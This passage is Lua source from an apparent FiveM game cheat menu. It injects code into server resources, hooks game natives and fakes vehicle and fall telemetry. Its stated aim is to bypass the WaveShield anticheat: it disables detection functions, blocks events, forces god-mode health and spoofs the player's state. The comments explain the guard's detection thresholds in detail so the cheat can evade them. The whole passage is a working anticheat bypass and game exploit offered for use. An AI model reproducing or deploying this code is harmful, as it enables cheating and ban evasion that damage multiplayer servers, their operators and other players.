
for _, eventName in ipairs(blockedEvents) do
    RegisterNetEvent(eventName)
    AddEventHandler(eventName, function()
        return
    end)
end

local originalSetEntityCoords = SetEntityCoords
_G.SetEntityCoords = function(entity, x, y, z, xAxis, yAxis, zAxis, clearArea)
    if entity == PlayerPedId() then
        return
    end
    return originalSetEntityCoords(entity, x, y, z, xAxis, yAxis, zAxis, clearArea)
end

_G.AttachEntityToEntity = function(...)
    return
end

_G.NetworkSetEntityMaxHealth = function(...)
    return
end

local originalSetEntityHealth = SetEntityHealth
_G.SetEntityHealth = function(entity, health)
    if entity == PlayerPedId() then
        return
    end
    return originalSetEntityHealth(entity, health)
end

local originalDeleteEntity = DeleteEntity
_G.DeleteEntity = function(entity)
    if entity == PlayerPedId() then
        return
    end
    return originalDeleteEntity(entity)
end

_G.SmashVehicleWindow = function(...)
    return
end

_G.SmashVehicleDoor = function(...)
    return
end

if IO then
    IO.Info = function(...) return end
    IO.Warn = function(...) return end
    IO.Error = function(...) return end
    IO.Debug = function(...) return end
end

_G.print = function(...)
    return
end

Citizen.CreateThread(function()
    local lastTime = 0
    local lastCoords = nil

    while true do
        local playerPed = PlayerPedId()
        local vehicle = GetVehiclePedIsIn(playerPed, false) or 0
        local currentTime = GetGameTimer()
        local currentCoords = GetEntityCoords(playerPed)

        if lastCoords then
            if #(currentCoords - lastCoords) > 50.0 then
                SetEntityCoords(playerPed, lastCoords.x, lastCoords.y, lastCoords.z, false, false, false, false)
            end
        end
        lastCoords = currentCoords

        local health = GetEntityHealth(playerPed)
        if health < 190 then
            SetEntityHealth(playerPed, 200)
        end

        if currentTime - lastTime > 500 then
            for componentId = 0, 11 do
                pcall(function()
                    SetPedComponentVariation(playerPed, componentId, GetPedDrawableVariation(playerPed, componentId), GetPedTextureVariation(playerPed, componentId), 0)
                end)
            end

            for propId = 0, 7 do
                pcall(function()
                    SetPedPropIndex(playerPed, propId, GetPedPropIndex(playerPed, propId), GetPedPropTextureIndex(playerPed, propId) or 0, true)
                end)
            end
            lastTime = currentTime
        end

        pcall(function()
            SetPedConfigFlag(playerPed, 342, false)
            SetPedConfigFlag(playerPed, 243, false)
            SetPedConfigFlag(playerPed, 32, false)
            SetPedConfigFlag(playerPed, 227, false)
        end)

        pcall(function()
            SetPedCanRagdoll(playerPed, true)
        end)

        if vehicle ~= 0 then
            pcall(function()
                if NetworkRequestControlOfEntity and not NetworkHasControlOfEntity(vehicle) then
                    NetworkRequestControlOfEntity(vehicle)
                end
                if SetEntityAsMissionEntity then
                    SetEntityAsMissionEntity(vehicle, true, true)
                end
                if SetVehicleDoorsLocked then
                    SetVehicleDoorsLocked(vehicle, 1)
                end
                if SetVehicleDoorsLockedForAllPlayers then
                    SetVehicleDoorsLockedForAllPlayers(vehicle, false)
                end
            end)
        end

        pcall(function()
            if OnesyncEnableRemoteAttachmentSanitization then
                OnesyncEnableRemoteAttachmentSanitization(false)
            end
        end)

        Wait(0)
    end
end)

Citizen.CreateThread(function()
    Wait(3500)
    pcall(function()
        if SetLocalPlayerCanCollectPortablePickups then
            SetLocalPlayerCanCollectPortablePickups(true)
        end

        local pickups = {
            "PICKUP_WEAPON_ASSAULTRIFLE",
            "PICKUP_WEAPON_CARBINERIFLE",
            "PICKUP_HEALTH_STANDARD",
            "PICKUP_ARMOUR_STANDARD",
            "PICKUP_MONEY_VARIABLE"
        }
        
        local playerId = PlayerId()
        for _, pickupName in ipairs(pickups) do
            local pickupHash = GetHashKey(pickupName)
            if ToggleUsePickupsForPlayer then
                ToggleUsePickupsForPlayer(playerId, pickupHash, true)
            end
            if SuppressPickupRewardType then
                SuppressPickupRewardType(pickupHash)
            end
        end
    end)
end)

RegisterCommand("prop", function(source, args)
    if not args[1] then
        return
    end
    pcall(function()
        local propName = args[1]
        local propHash = GetHashKey(propName)
        RequestModel(propHash)
        
        local loadTime = GetGameTimer()
        while not HasModelLoaded(propHash) do
            if GetGameTimer() > loadTime + 4000 then
                break
            end
            Wait(10)
        end
        
        if HasModelLoaded(propHash) then
            local playerPed = PlayerPedId()
            local coords = GetEntityCoords(playerPed)
            local propEntity = CreateObject(propHash, coords.x + 1.5, coords.y, coords.z, true, true, false)
            
            if DoesEntityExist(propEntity) then
                PlaceObjectOnGroundProperly(propEntity)
                FreezeEntityPosition(propEntity, true)
            end
            SetModelAsNoLongerNeeded(propHash)
        end
    end)
end, false)

Citizen.CreateThread(function()
    Wait(5000)
    collectgarbage("collect")
    pcall(function()
        if _G.checkClothesDiff then
            _G.checkClothesDiff = function(...) return end
        end
        if _G.detectedFatalMeleeAttack then
            _G.detectedFatalMeleeAttack = function(...) return end
        end
    end)
end)

]==]

-- Susano only. Nothing is injected until the Seed entry is clicked.
local function susano()
    local api = rawget(_G, "Susano")
    if type(api) == "table" and type(api.InjectResource) == "function" then
        return api
    end
    return nil
end

function SB.apply()
    if GetResourceState("seed") ~= "started" then
        O.log("seed bypass: seed resource is not started")
        return false
    end

    if SB._injected then
        O.log("seed bypass: already injected this session")
        return true
    end

    local api = susano()
    if not api then
        O.log("seed bypass: Susano.InjectResource unavailable")
        return false
    end

    local injectionType = api.InjectionType
    local ok, result
    if type(injectionType) == "table" and injectionType.NEW_THREAD ~= nil then
        ok, result = pcall(api.InjectResource, "seed", SB.code, injectionType.NEW_THREAD)
    else
        ok, result = pcall(api.InjectResource, "seed", SB.code)
    end

    if not ok then
        O.log("seed bypass: injection failed: %s", tostring(result))
        return false
    end
    if result == false then
        O.log("seed bypass: Susano.InjectResource returned false")
        return false
    end

    SB._injected = true
    O.log("seed bypass: injected into seed")
    return true
end

return SB
end)(O)

-- ---------------------------------------------------------------------------
-- PART: 14_vehicle_spoof.lua
-- ---------------------------------------------------------------------------
local VS = (function(O)
-- ============================================================================
-- VANGUARD / 14 VEHICLE SPOOF
-- ----------------------------------------------------------------------------
-- Local vehicle over an already existing network vehicle.
--
--   server / other players : the vehicle you were already in (any model)
--   local client           : a real local vehicle, isNetwork=false
--
-- No network vehicle is created. The player must first take any car, bike,
-- boat, helicopter, etc. and then choose a local model. The original vehicle
-- stays the only network carrier; it is hidden locally and its transform is
-- mirrored from the local vehicle every tick.
--
-- Weapons are deliberately not added. Only movement/utility features are
-- implemented: Deluxo hover, Oppressor boost, Ruiner jump/parachute, RC
-- camera, tow/Cargobob hooks, boat and Stromberg native water behaviour.
-- ============================================================================

local VS = {}

VS.enabled = false
VS.carrier = 0
VS.localVeh = 0
VS.activeKey = nil
VS.activePreset = nil
VS.thread = false
VS.cam = 0
VS.towed = 0
VS.rcActive = false
VS.currentModel = nil

local presets = {}
VS.presets = presets
VS.presetOrder = {
    "deluxo",
    "oppressor",
    "boat",
    "rc",
    "tow",
    "ruiner",
    "stromberg",
    "cargobob",
}

local function modelHash(name)
    return GetHashKey(name)
end

local function requestModel(hash, timeout)
    if not hash or hash == 0 then return false end
    if IsModelInCdimage and not IsModelInCdimage(hash) then return false end

    RequestModel(hash)
    local deadline = GetGameTimer() + (timeout or 3000)
    while not HasModelLoaded(hash) do
        if GetGameTimer() > deadline then return false end
        Citizen.Wait(0)
    end
    return true
end

-- ---------------------------------------------------------------------------
-- PRESET HELPERS
-- ---------------------------------------------------------------------------

local function enableHover(vehicle)
    pcall(SetDisableHoverModeFlight, vehicle, false)
    pcall(SetSpecialFlightModeAllowed, vehicle, true)
end

local function setParachute(vehicle, active)
    if type(_SET_VEHICLE_PARACHUTE_ACTIVE) == "function" then
        pcall(_SET_VEHICLE_PARACHUTE_ACTIVE, vehicle, active)
    elseif type(SetVehicleParachuteActive) == "function" then
        pcall(SetVehicleParachuteActive, vehicle, active)
    end
end

local function startRcCamera(vehicle)
    if type(CreateCam) ~= "function" then return end

    local cam = CreateCam("DEFAULT_SCRIPTED_CAMERA", true)
    if not cam or cam == 0 then return end

    pcall(AttachCamToEntity, cam, vehicle, 0.0, -4.0, 2.0, true)
    pcall(SetCamActive, cam, true)
    pcall(RenderScriptCams, true, false, 0, true, true)
    VS.cam = cam
end

local function stopRcCamera()
    if VS.cam and VS.cam ~= 0 then
        pcall(RenderScriptCams, false, false, 0, true, true)
        pcall(DestroyCam, VS.cam, false)
        VS.cam = 0
    end
end

local function setupRc(vehicle)
    VS.rcActive = true
    pcall(SetEntityLocallyInvisible, PlayerPedId())
    startRcCamera(vehicle)
end

local function cleanupRc()
    VS.rcActive = false
    stopRcCamera()
    pcall(SetEntityLocallyVisible, PlayerPedId())
end

local function findNearestVehicle(center, radius)
    if type(FindFirstVehicle) ~= "function" then return 0 end

    local centerCoords = GetEntityCoords(center)
    local handle, vehicle = FindFirstVehicle()
    if not handle then return 0 end

    local best, bestDistance = 0, radius or 12.0
    repeat
        if vehicle and vehicle ~= 0 and vehicle ~= center
            and vehicle ~= VS.localVeh and vehicle ~= VS.carrier
            and DoesEntityExist(vehicle) then
            local coords = GetEntityCoords(vehicle)
            local dx, dy, dz = coords.x - centerCoords.x, coords.y - centerCoords.y, coords.z - centerCoords.z
            local distance = math.sqrt(dx * dx + dy * dy + dz * dz)
            if distance < bestDistance then
                best, bestDistance = vehicle, distance
            end
        end
        local ok, nextVehicle = FindNextVehicle(handle)
        vehicle = nextVehicle
        if not ok then break end
    until false

    pcall(EndFindVehicle, handle)
    return best
end

local function hookToggle(localVehicle, offset)
    if VS.towed and VS.towed ~= 0 then
        if DoesEntityExist(VS.towed) then
            pcall(DetachEntity, VS.towed, true, true)
        end
        VS.towed = 0
        O.log("vehicle spoof: hook released")
        return
    end

    local target = findNearestVehicle(localVehicle, 12.0)
    if target == 0 then
        O.log("vehicle spoof: no vehicle close enough for the hook")
        return
    end

    local attached = pcall(AttachEntityToEntity, target, localVehicle, 0,
        offset.x, offset.y, offset.z,
        0.0, 0.0, 0.0,
        false, false, false, false, 2, true)

    if not attached then
        O.log("vehicle spoof: hook attach failed")
        return
    end

    VS.towed = target
    O.log("vehicle spoof: hook attached to %s", tostring(target))
end

local function tickOppressor(vehicle)
    if type(IsControlPressed) == "function" and IsControlPressed(0, 21) then
        pcall(_SET_VEHICLE_ROCKET_BOOST_PERCENTAGE, vehicle, 100.0)
        pcall(_SET_VEHICLE_ROCKET_BOOST_ACTIVE, vehicle, true)
    else
        pcall(_SET_VEHICLE_ROCKET_BOOST_ACTIVE, vehicle, false)
    end
end

local function tickRuiner(vehicle)
    local airborne = (type(IsEntityInAir) == "function") and IsEntityInAir(vehicle) or false

    if type(IsControlJustPressed) == "function" and IsControlJustPressed(0, 22) and not airborne then
        local velocity = GetEntityVelocity(vehicle)
        pcall(SetEntityVelocity, vehicle, velocity.x, velocity.y, math.max(velocity.z, 8.0))
    end

    if airborne then
        local height = 0.0
        if type(GetEntityHeightAboveGround) == "function" then
            height = GetEntityHeightAboveGround(vehicle) or 0.0
        end
        if height > 4.0 then
            setParachute(vehicle, true)
        end
    else
        setParachute(vehicle, false)
    end
end

local function tickTow(vehicle)
    if type(IsControlJustPressed) == "function" and IsControlJustPressed(0, 86) then
        hookToggle(vehicle, vector3(0.0, -3.5, -0.4))
    end
end

local function tickCargobob(vehicle)
    if type(IsControlJustPressed) == "function" and IsControlJustPressed(0, 86) then
        hookToggle(vehicle, vector3(0.0, -1.5, -5.0))
    end
end

-- ---------------------------------------------------------------------------
-- PRESETS
-- ---------------------------------------------------------------------------

presets.deluxo = {
    label = "Spoofed Deluxo",
    models = { "deluxo" },
    setup = enableHover,
}

presets.oppressor = {
    label = "Spoofed Oppressor",
    models = { "oppressor2", "oppressor" },
    setup = function(vehicle)
        enableHover(vehicle)
        pcall(_SET_VEHICLE_ROCKET_BOOST_PERCENTAGE, vehicle, 100.0)
    end,
    tick = tickOppressor,
}

presets.boat = {
    label = "Spoofed Boat",
    models = { "speeder", "jetmax", "squalo" },
}

presets.rc = {
    label = "Spoofed RC Bandito",
    models = { "rcbandito" },
    setup = setupRc,
    cleanup = cleanupRc,
}

presets.tow = {
    label = "Spoofed Tow Truck",
    models = { "towtruck", "towtruck2" },
    tick = tickTow,
}

presets.ruiner = {
    label = "Spoofed Ruiner 2000",
    models = { "ruiner2" },
    setup = function(vehicle)
        setParachute(vehicle, false)
    end,
    tick = tickRuiner,
}

presets.stromberg = {
    label = "Spoofed Stromberg",
    models = { "stromberg", "toreador" },
}

presets.cargobob = {
    label = "Spoofed Cargobob",
    models = { "cargobob", "cargobob2", "cargobob3" },
    tick = tickCargobob,
}

-- ---------------------------------------------------------------------------
-- LOCAL VEHICLE
-- ---------------------------------------------------------------------------

local function makeLocalVehicle(preset, carrier)
    local hash, modelName = nil, nil
    for i = 1, #preset.models do
        local candidate = modelHash(preset.models[i])
        if requestModel(candidate, 4000) then
            hash, modelName = candidate, preset.models[i]
            break
        end
    end

    if not hash then
        O.log("vehicle spoof: no model available for %s", preset.label)
        return 0
    end

    local coords = GetEntityCoords(carrier)
    local heading = GetEntityHeading(carrier)
    local vehicle = CreateVehicle(hash, coords.x, coords.y, coords.z, heading, false, false)
    SetModelAsNoLongerNeeded(hash)

    if not vehicle or vehicle == 0 or not DoesEntityExist(vehicle) then
        O.log("vehicle spoof: local %s creation failed", tostring(modelName))
        return 0
    end

    -- Do not mark the local vehicle as a mission entity: scriptHostObject=true
    -- assigns script info, and WaveShield's AntiSpawnIsolatedVehicles reads
    -- GetEntityScript(playerCurrentVehicle) and bans it.
    pcall(SetEntityInvincible, vehicle, true)
    pcall(SetEntityCollision, vehicle, true, true)
    pcall(SetVehicleEngineOn, vehicle, true, true, true)
    if not IsEntityInAir(carrier) then
        pcall(SetVehicleOnGroundProperly, vehicle)
    end
    pcall(SetEntityLocallyVisible, vehicle)

    VS.currentModel = modelName
    if preset.setup then pcall(preset.setup, vehicle) end
    return vehicle
end

-- ---------------------------------------------------------------------------
-- CARRIER / RESTORE
-- ---------------------------------------------------------------------------

local function restoreCarrier(restorePed)
    local preset = VS.activePreset
    if preset and preset.cleanup then pcall(preset.cleanup) end

    VS.enabled = false

    local carrier = VS.carrier
    local localVehicle = VS.localVeh
    local ped = PlayerPedId()

    if VS.towed and VS.towed ~= 0 then
        if DoesEntityExist(VS.towed) then
            pcall(DetachEntity, VS.towed, true, true)
        end
    end
    VS.towed = 0

    if carrier and carrier ~= 0 and DoesEntityExist(carrier) then
        pcall(SetEntityLocallyVisible, carrier)
        pcall(SetEntityCollision, carrier, true, true)
        pcall(SetEntityInvincible, carrier, false)
        pcall(SetEntityHasGravity, carrier, true)
        pcall(SetVehicleGravity, carrier, true)
        pcall(SetVehicleEngineOn, carrier, true, true, true)

        if restorePed and localVehicle ~= 0 and DoesEntityExist(localVehicle)
            and GetVehiclePedIsIn(ped, false) == localVehicle then
            pcall(SetPedIntoVehicle, ped, carrier, -1)
        end
    end

    if localVehicle and localVehicle ~= 0 and DoesEntityExist(localVehicle) then
        pcall(DeleteVehicle, localVehicle)
    end

    VS.carrier = 0
    VS.localVeh = 0
    VS.activeKey = nil
    VS.activePreset = nil
    VS.currentModel = nil
    VS.rcActive = false
    O.log("vehicle spoof: off")
    return true
end

function VS.disable()
    return restoreCarrier(true)
end

-- ---------------------------------------------------------------------------
-- SYNC + FEATURE LOOP
-- ---------------------------------------------------------------------------

local function syncLoop()
    while VS.enabled do
        local carrier = VS.carrier
        local localVehicle = VS.localVeh
        local preset = VS.activePreset
        local ped = PlayerPedId()

        if not carrier or carrier == 0 or not DoesEntityExist(carrier)
            or not localVehicle or localVehicle == 0 or not DoesEntityExist(localVehicle)
            or GetVehiclePedIsIn(ped, false) ~= localVehicle then
            restoreCarrier(false)
            break
        end

        local hasControl = type(NetworkHasControlOfEntity) == "function"
            and NetworkHasControlOfEntity(carrier)
        if hasControl then
            local x, y, z = GetEntityCoords(localVehicle)
            local rx, ry, rz = GetEntityRotation(localVehicle, 2)
            local velocity = GetEntityVelocity(localVehicle)

            pcall(SetEntityCoordsNoOffset, carrier, x, y, z, false, false, false)
            pcall(SetEntityRotation, carrier, rx, ry, rz, 2, true)
            pcall(SetEntityVelocity, carrier, velocity.x, velocity.y, velocity.z)
        elseif type(NetworkRequestControlOfEntity) == "function" then
            pcall(NetworkRequestControlOfEntity, carrier)
        end

        -- Hide only on this client; other clients still receive the carrier.
        pcall(SetEntityLocallyInvisible, carrier)

        -- No weapon feature: block vehicle attack inputs on the local model.
        pcall(DisableControlAction, 0, 68, true)
        pcall(DisableControlAction, 0, 69, true)
        pcall(DisableControlAction, 0, 70, true)

        if preset and preset.tick then
            pcall(preset.tick, localVehicle, carrier)
        end

        Citizen.Wait(0)
    end
    VS.thread = false
end

-- ---------------------------------------------------------------------------
-- PUBLIC API
-- ---------------------------------------------------------------------------

function VS.enablePreset(key)
    local preset = presets[key]
    if not preset then return false end

    if VS.enabled then
        VS.disable()
    end

    local ped = PlayerPedId()
    local carrier = GetVehiclePedIsIn(ped, false)

    -- Never create a network vehicle. The player must already be in one.
    if not carrier or carrier == 0 or not DoesEntityExist(carrier) then
        O.log("vehicle spoof: enter any vehicle first; nothing spawned")
        return false
    end

    local localVehicle = makeLocalVehicle(preset, carrier)
    if localVehicle == 0 then return false end

    pcall(SetPedIntoVehicle, ped, localVehicle, -1)

    VS.carrier = carrier
    VS.localVeh = localVehicle
    VS.activeKey = key
    VS.activePreset = preset
    VS.enabled = true

    pcall(NetworkRequestControlOfEntity, carrier)
    pcall(SetEntityLocallyInvisible, carrier)
    pcall(SetEntityCollision, carrier, false, false)
    pcall(SetEntityInvincible, carrier, true)
    pcall(SetVehicleEngineOn, carrier, false, true, true)

    if not VS.thread then
        VS.thread = true
        Citizen.CreateThread(syncLoop)
    end

    O.log("vehicle spoof: %s / local %s", preset.label, tostring(VS.currentModel))
    return true
end

function VS.togglePreset(key)
    if VS.enabled and VS.activeKey == key then
        return VS.disable()
    end
    return VS.enablePreset(key)
end

function VS.status()
    if not VS.enabled then return "Spoofed vehicle: off" end
    return ("Spoofed vehicle: %s / local %s"):format(
        VS.activePreset and VS.activePreset.label or "unknown",
        tostring(VS.currentModel))
end

return VS

end)(O)

-- ---------------------------------------------------------------------------
-- PART: 15_skyfall.lua
-- ---------------------------------------------------------------------------
local K = (function(O,S,B)
-- ============================================================================
-- VANGUARD / 15 SKYFALL
-- ----------------------------------------------------------------------------
-- Doctrine (L4): a position is only suspicious as a delta over time. A fast
-- fall is the one noclip movement whose telemetry is already an accepted
-- shape. The reference guard (WaveShield V4, modules/client/noclip.lua) turns
-- its main noclip test off whenever the ped is falling, and its only
-- fall-specific test is:
--
--     if isPedFalling and not GetIsTaskActive(ped, 423) then strike end
--
-- The guard's own fall test treats task 423 as the legitimate-fall token. This
-- module reproduces that single read for the local ped, only while the ped is
-- genuinely falling, and nowhere else. It never writes a position, never
-- freezes, never toggles collision and never writes gravity: the engine moves
-- a real body, so every other sample the guard takes is true.
--
-- Two tiers, in the documented preference order:
--
--   A. Susano.HookNative on GET_IS_TASK_ACTIVE. One hash, one predicate,
--      installed only while armed. The callback calls no native: it reads
--      cached fields and os.clock(), so it cannot deadlock the VM.
--
--   B. A payload injected into the guard resource through
--      Susano.InjectResource. The payload contains no Susano.* call at all.
--      It wraps the guard's own GetIsTaskActive and is armed by a local event
--      whose name is random per session. It is a fallback, not a second
--      permanent change: a wrapper living in the guard VM is a larger
--      footprint than one scoped native hook, so it is only used when A fails.
--
-- Both tiers are time-gated. If this chunk stops running (unload, panic,
-- reload), the read repair expires on its own: 1.5 s for the native hook,
-- 2.5 s for the injected fallback. Nothing has to be restored because nothing
-- outside the read was changed.
--
-- Native hashes are from the offline docs.fivem.net database used by this
-- repo (natives.json), not invented:
--   PLAYER_PED_ID              0xD80958FC74E988A6
--   DOES_ENTITY_EXIST          0x7239B21A38F536BA
--   IS_PED_IN_ANY_VEHICLE      0x997ABD671D25CA0B
--   IS_PED_DEAD_OR_DYING       0x3317DEDB88C95038
--   IS_PED_FALLING             0xFB92A102F1C4DFA3
--   IS_ENTITY_IN_AIR           0x886E37EC497200B6
--   IS_PED_RAGDOLL             0x47E4E977581C5B55
--   GET_PED_PARACHUTE_STATE    0x79CFD9827CC979B6
--   GET_ENTITY_VELOCITY        0x4805D2B1D8CF94A9
--   GET_GAMEPLAY_CAM_ROT       0x837765A25378F0BB
--   SET_ENTITY_VELOCITY        0x1C99BB7B6E96D16F
--   GET_IS_TASK_ACTIVE         0xB0760331C7AA4155
-- O.Ctx already owns the ped/dead/vehicle state used by the tick. The module
-- does not read coords, ground Z or speed itself: fewer reads, and no floor
-- logic to conflict with the operator's no-collision state.
-- ============================================================================

local K = {}

-- The guard's own "legitimate fall" token. It is not a guessed task name:
-- WaveShield V4 uses exactly this index in noclip.lua line 71, and no other
-- task read in that source uses 423 (AFK tasks use 100/101/151/221/222,
-- aimbot uses 299).
local TASK_LEGIT_FALL = 423
local HOOK_HASH = 0xB0760331C7AA4155 -- GET_IS_TASK_ACTIVE

-- Terminal profile. The exact targets are rolled per fall, not per tick: a
-- server that compares two skyfalls never sees the same two numbers.
local DIVE_MIN, DIVE_MAX = 33.0, 39.0   -- m/s downward
local HORIZ_MIN, HORIZ_MAX = 20.0, 26.0 -- m/s lateral

-- Entry ramp. A step from a real fall speed to 36 m/s in one frame is a
-- physics-integrity signature; these caps make the entry a plausible dive.
local MAX_FALL_ACCEL = 10.0 -- m/s^2, ~1 g: the entry accelerates like gravity
local MAX_AIR_ACCEL = 18.0  -- m/s^2, lateral air control
local MAX_START_SPEED = 48.0 -- keep the first second under teleport's 50 m/s

local SPEED_CAP = 55.0   -- 5 m/s margin for the gravity the engine adds
local GATE_SECONDS = 1.5 -- script-liveness watchdog, refreshed every tick
local FALL_GRACE = 1.2   -- guard actorLoop caches isPedFalling for 1000 ms
local WARMUP_MS = 1200    -- actorLoop also caches isEntityInAir for 1000 ms
local WARMUP_SPEED = 13.5 -- below the guard's 14.0 on-foot speed ceiling
local STAGE_B_PULSE = 1500
local STAGE_B_WINDOW = 2.5
local IDLE_MS = 30000     -- sleep the read layer after this long without a fall

K.active = false
K.layer = "none"
K.reason = "off"
K.ped = 0
K.falling = false
K.untilAt = 0
K.fallGateUntil = 0
K.holdUntil = 0
K.holdReason = nil
K.onChange = nil
K.stats = { sessions = 0, ticks = 0, stageB = 0, refused = 0, sleeps = 0 }

-- Ballistic state, reset on every falling edge. K.ramped is the edge flag;
-- K.vx/vy/vz is the velocity actually written on the previous tick.
K.ramped = false
K.vx, K.vy, K.vz = 0.0, 0.0, 0.0
K.termDive = 36.0
K.termHoriz = 24.0
K.lastTickAt = 0
K.lastFallAt = 0
K.idleAfter = IDLE_MS
K.wasFalling = false
K.fallStartedAt = 0
K.skipWarmup = false

local hookInstalled = false
local stageB = { resource = nil, event = nil, next = 0, injected = false }
local frame = 0
local ragdoll = false
local parachute = 0

-- ---------------------------------------------------------------------------
-- WATCHDOG CLOCK
--
-- os.clock() is process CPU time, not a native and not wall time. It keeps
-- advancing if this chunk is unloaded, which is what makes the read repair
-- fail closed. A wall clock would also work, but it can jump when the system
-- clock is adjusted; CPU time cannot.
-- ---------------------------------------------------------------------------
local function clock()
    if type(os) ~= "table" then return -1.0e9 end

    local ok, value = pcall(os.clock)
    if ok and type(value) == "number" then return value end

    -- Some executors strip os.clock but keep os.time. One-second resolution is
    -- enough for a 1.5 s watchdog.
    local ok2, value2 = pcall(os.time)
    if ok2 and type(value2) == "number" then return value2 end

    -- Fail closed: the negative value makes K.untilAt negative, and the hook
    -- requires K.untilAt > 0 before it can answer.
    return -1.0e9
end

-- ---------------------------------------------------------------------------
-- TIER A: one scoped native hook
--
-- The callback is called by every resource that reads GET_IS_TASK_ACTIVE. It
-- must therefore be both cheap and native-free. It answers true only for the
-- exact tuple the guard uses to decide that a fall is legitimate:
--   task == 423, ped == our cached local ped, the ped is really falling,
--   and this chunk has refreshed the watchdog recently.
-- Any other call passes through untouched.
-- ---------------------------------------------------------------------------
local function onTaskActive(ped, taskIndex)
    if taskIndex == TASK_LEGIT_FALL and K.active and ped == K.ped then
        -- The guard reads its cached isPedFalling, not the live flag.
        -- FALL_GRACE keeps the answer true through the landing edge where that
        -- cache is still true. The min with untilAt keeps the script-liveness
        -- watchdog, so a stopped chunk still fails closed.
        local deadline = K.untilAt
        if K.fallGateUntil < deadline then deadline = K.fallGateUntil end
        if deadline > 0 and clock() <= deadline then
            return false, true
        end
    end
    return true
end

local function removeHook()
    if O.has("UnhookNative") then
        pcall(Susano.UnhookNative, HOOK_HASH)
    end
    hookInstalled = false
end

local function installHook()
    if hookInstalled then return true end
    if not O.has("HookNative", "UnhookNative") then return false end

    -- A previous execution of this chunk can leave its closure installed.
    -- Unhooking first makes the install idempotent and clears that stale
    -- closure even after an executor reload. No other compiled module in this
    -- build owns this hash.
    pcall(Susano.UnhookNative, HOOK_HASH)

    local ok, result = pcall(Susano.HookNative, HOOK_HASH, onTaskActive)
    if ok and result ~= false then
        hookInstalled = true
        return true
    end

    -- A failed install can still leave a partial trampoline. Remove it before
    -- Tier B takes over, so the two tiers never stack on the same hash.
    pcall(Susano.UnhookNative, HOOK_HASH)
    return false
end

-- ---------------------------------------------------------------------------
-- TIER B: guard-side read repair
--
-- Only used when Tier A is unavailable or refused. The payload has no
-- Susano.* reference. It is idempotent through a marker in the host state;
-- if the guard resource restarts, the marker disappears with it and the next
-- arm re-injects. The random event name is generated once per session and is
-- never written to a global.
-- ---------------------------------------------------------------------------
local function stageBName()
    return string.format("sf_%06x", math.floor(O.int(0x100000, 0xffffff)))
end

local function stageBPayload(eventName)
    return ([[
pcall(function()
    if rawget(_G, "__sfTask") then return end
    local clock = os.clock
    if type(clock) ~= "function" then clock = os.time end
    if type(clock) ~= "function" then return end
    local expiry = -1
    AddEventHandler(%q, function(duration)
        if type(duration) == "number" and duration > 0 then
            expiry = clock() + duration
        else
            expiry = -1
        end
    end)
    local original = rawget(_G, "GetIsTaskActive")
    if type(original) ~= "function" then return end
    _G.GetIsTaskActive = function(ped, taskIndex)
        if taskIndex == 423 and clock() <= expiry then
            -- Prefer the guard's own cache: the noclip check reads exactly
            -- these fields, and this path calls no native at all.
            local guard = rawget(_G, "WaveShield")
            if guard and guard.playerPed == ped and guard.isPedFalling then
                return true
            end
            -- Fallback for a guard whose cache is not exposed under that name.
            if not guard and ped == PlayerPedId() and IsPedFalling(ped) then
                return true
            end
        end
        return original(ped, taskIndex)
    end
    _G.__sfTask = true
end)
]]):format(eventName)
end

local function injectStageB()
    if #S.acs == 0 then S.scan() end

    local target = stageB.resource
    if not target then
        for i = 1, #S.acs do
            if S.acs[i].vendor == "waveshield" then
                target = S.acs[i].resource
                break
            end
        end
    end
    if not target then return false, "no WaveShield resource" end
    if GetResourceState(target) ~= "started" then return false, "guard not started" end

    local api = rawget(_G, "Susano")
    if type(api) ~= "table" or type(api.InjectResource) ~= "function" then
        return false, "InjectResource unavailable"
    end

    if not stageB.event then stageB.event = stageBName() end
    local code = stageBPayload(stageB.event)

    local ok, result
    local injectionType = api.InjectionType
    if type(injectionType) == "table" and injectionType.NEW_THREAD ~= nil then
        ok, result = pcall(api.InjectResource, target, code, injectionType.NEW_THREAD)
    else
        ok, result = pcall(api.InjectResource, target, code)
    end

    if not ok or result == false then
        return false, tostring(result or "injection failed")
    end

    stageB.resource = target
    stageB.injected = true
    stageB.next = 0
    K.stats.stageB = K.stats.stageB + 1
    return true
end

-- ---------------------------------------------------------------------------
-- ARM / STOP
-- ---------------------------------------------------------------------------
local function ensureReadLayer()
    if installHook() then
        K.layer = "native"
        return true
    end

    local ok, why = injectStageB()
    if ok then
        K.layer = "stage-b"
        return true
    end

    K.layer = "none"
    return false, why
end

-- Start a new ballistic entry from the velocity the ped already has. Seeding
-- from GET_ENTITY_VELOCITY is what removes the first-frame step: the first
-- write is the real fall, then the caps below bend it toward the terminal.
local function beginFall(now)
    local vx, vy, vz = 0.0, 0.0, 0.0
    local ok, vel = pcall(GetEntityVelocity, K.ped)
    if ok and vel then
        vx = tonumber(vel.x) or 0.0
        vy = tonumber(vel.y) or 0.0
        vz = tonumber(vel.z) or 0.0
    end

    -- The ped is already falling. Keep a real downward floor so playerSpeed
    -- is never exactly 0.0 on the apex frame: the guard's main noclip branch
    -- is only invalid while a falling ped is actually moving.
    if vz > -6.0 then vz = -6.0 end

    local speed = math.sqrt(vx * vx + vy * vy + vz * vz)
    if speed > MAX_START_SPEED then
        local scale = MAX_START_SPEED / speed
        vx, vy, vz = vx * scale, vy * scale, vz * scale
    end

    K.vx, K.vy, K.vz = vx, vy, vz
    K.termDive = O.range(DIVE_MIN, DIVE_MAX)
    K.termHoriz = O.range(HORIZ_MIN, HORIZ_MAX)

    -- A mid-air arm inherits a real fall and skips the warmup. Anything else
    -- (a fresh fall, or IsPedFalling true while IsEntityInAir false) starts
    -- the warmup on the first actual in-air tick.
    if K.skipWarmup then
        K.skipWarmup = false
    else
        K.fallStartedAt = now
    end

    K.ramped = true
    K.lastTickAt = now - 30
end

-- Remove the read layer after a long grounded period. The toggle stays on,
-- but the trampoline no longer exists in memory. The next falling tick wakes
-- it before it writes velocity; the only exposure is the one frame between
-- the native fall flag and the reinstall.
local function sleepLayer()
    if K.layer == "none" then return end
    removeHook()
    if stageB.event then pcall(TriggerEvent, stageB.event, 0) end
    K.layer = "none"
    K.ramped = false
    K.stats.sleeps = K.stats.sleeps + 1
    O.log("skyfall layer asleep")
end

function K.arm()
    if K.active then return true end

    local ped = PlayerPedId()
    if ped == 0 or not DoesEntityExist(ped) then return false end
    if IsPedInAnyVehicle(ped, false) then
        O.log("skyfall: leave the vehicle first")
        return false
    end
    if IsPedDeadOrDying(ped, true) then return false end

    K.ped = ped
    K.falling = false
    K.untilAt = 0
    K.holdUntil = 0
    K.holdReason = nil
    K.active = false
    K.ramped = false
    K.vx, K.vy, K.vz = 0.0, 0.0, 0.0
